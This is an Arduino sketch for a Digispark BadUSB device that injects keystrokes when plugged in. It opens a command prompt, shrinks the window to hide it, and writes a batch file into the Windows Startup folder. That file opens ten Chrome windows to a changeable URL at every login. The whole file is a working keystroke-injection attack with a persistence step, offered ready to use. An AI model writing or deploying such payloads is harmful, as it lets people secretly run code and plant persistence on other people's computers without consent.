#include "DigiKeyboard.h"

void setup() {
    DigiKeyboard.sendKeyStroke(0,MOD_GUI_LEFT);
    DigiKeyboard.delay(100);
    DigiKeyboard.println("cmd");
    DigiKeyboard.delay(500);
    DigiKeyboard.println("mode con: cols=16 lines=1&color FE");
    DigiKeyboard.println("cd AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup&echo for /l %%i in (1,1,10) do (start chrome /new-window <https://www.example.com>)>a.bat&exit"); //Change url
}
void loop() {
}
